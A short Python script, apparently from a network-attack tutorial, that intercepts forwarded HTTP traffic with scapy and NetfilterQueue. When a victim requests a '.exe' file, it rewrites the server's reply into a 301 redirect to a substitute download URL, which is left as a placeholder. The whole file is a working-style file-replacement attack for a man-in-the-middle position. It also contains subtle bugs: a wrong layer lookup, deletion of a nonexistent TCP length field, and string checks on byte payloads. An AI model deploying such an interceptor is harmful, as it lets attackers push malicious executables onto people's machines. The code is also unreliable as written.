import scapy.all as scapy
from netfilterqueue import NetfilterQueue

# Clear existing iptables rules
# iptables --flush
# Set up iptables rule to redirect FORWARD traffic to NetfilterQueue with queue number 0
# iptables -I FORWARD -j NFQUEUE --queue -num 0

ack_list = []  # List to store TCP acknowledgment numbers

# Function to modify packet payload and redirect to a specified URL
def set_load(packet, url_to_download):
    load = f'HTTP/1.1 301 Moved Permanently\nLocation: {url_to_download}\n\n'
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

# Function to process intercepted packets
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if packet contains Raw layer (payload)
    if scapy_packet.haslayer(scapy.Raw):
        # Check if destination port is 80 (HTTP)
        if scapy_packet[scapy.TCP].dport == 80:
            # Check if '.exe' is present in the payload
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] .exe Requested')
                ack_list.append(scapy_packet[scapy_packet.TCP].ack)

        # Check if source port is 80 (HTTP)
        elif scapy_packet[scapy.TCP].sport == 80:
            # Check if TCP sequence number is in the ack_list
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing File')

                # Modify packet payload and set it to a specified URL
                modified_packet = set_load(scapy_packet, 'example download url for a file' )
                packet.set_payload(str(modified_packet))

# Create a NetfilterQueue object and bind it to queue number 0, then run the queue
queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
